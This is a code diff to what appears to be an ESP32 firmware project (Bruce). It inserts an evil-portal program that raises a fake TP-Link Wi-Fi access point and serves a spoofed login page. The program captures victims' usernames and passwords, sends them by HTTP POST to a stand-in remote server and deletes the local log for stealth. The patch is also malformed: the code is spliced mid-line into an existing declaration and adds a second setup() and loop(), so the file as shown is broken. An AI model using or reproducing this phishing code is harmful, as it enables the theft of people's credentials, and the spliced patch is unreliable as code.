@@ -14,7 +14,85 @@ BruceConfig bruceConfig;
 
 StartupApp startupApp;
 MainMenu mainMenu;
-SPIClass sdcardSPI;
+SPIClass sdcardSPI;#include <WiFi.h>
+#include <ESPAsyncWebServer.h>
+#include <SPIFFS.h>
+
+// Fake Wi-Fi AP Credentials
+const char* ssid = "TP-Link_WiFi";
+const char* password = "12345678";
+
+AsyncWebServer server(80);
+
+void setup() {
+    Serial.begin(115200);
+
+    // Start SPIFFS
+    if (!SPIFFS.begin(true)) {
+        Serial.println("SPIFFS Mount Failed");
+        return;
+    }
+
+    // Start Fake TP-Link Wi-Fi AP
+    WiFi.softAP(ssid, password);
+    Serial.println("Fake TP-Link Wi-Fi AP Started");
+
+    // Serve the TP-Link login page
+    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+        request->send(SPIFFS, "/index.html", "text/html");
+    });
+
+    // Auto-redirect all requests to the Evil Portal
+    server.onNotFound([](AsyncWebServerRequest *request){
+        request->redirect("/");
+    });
+
+    // Handle login submission
+    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
+        if (request->hasParam("username", true) && request->hasParam("password", true)) {
+            String username = request->getParam("username", true)->value();
+            String password = request->getParam("password", true)->value();
+
+            // Save credentials locally
+            File file = SPIFFS.open("/log.txt", "a");
+            if (file) {
+                file.println("Username: " + username + " | Password: " + password);
+                file.close();
+            }
+
+            Serial.println("Captured: " + username + " | " + password);
+
+            // Send credentials to remote server
+            WiFiClient client;
+            if (client.connect("your-server.com", 80)) {  // Replace with actual server
+                String data = "username=" + username + "&password=" + password;
+                client.print("POST /capture.php HTTP/1.1\r\n");
+                client.print("Host: your-server.com\r\n");
+                client.print("Content-Length: " + String(data.length()) + "\r\n");
+                client.print("Content-Type: application/x-www-form-urlencoded\r\n");
+                client.print("\r\n");
+                client.print(data);
+                client.stop();
+            }
+
+            // Delete local log file (optional for stealth)
+            if (SPIFFS.exists("/log.txt")) {
+                SPIFFS.remove("/log.txt");
+            }
+
+            // Redirect to fake success page
+            request->send(200, "text/html", "<h3>Login Successful. Redirecting...</h3><script>setTimeout(function(){ window.location='https://tplinkwifi.net'; }, 2000);</script>");
+        } else {
+            request->send(400, "text/html", "<h3>Invalid request.</h3>");
+        }
+    });
+
+    server.begin();
+}
+
+void loop() {
+    // Bruce firmware handles web requests automatically
+}
 SPIClass CC_NRF_SPI;
 
 // Navigation Variables
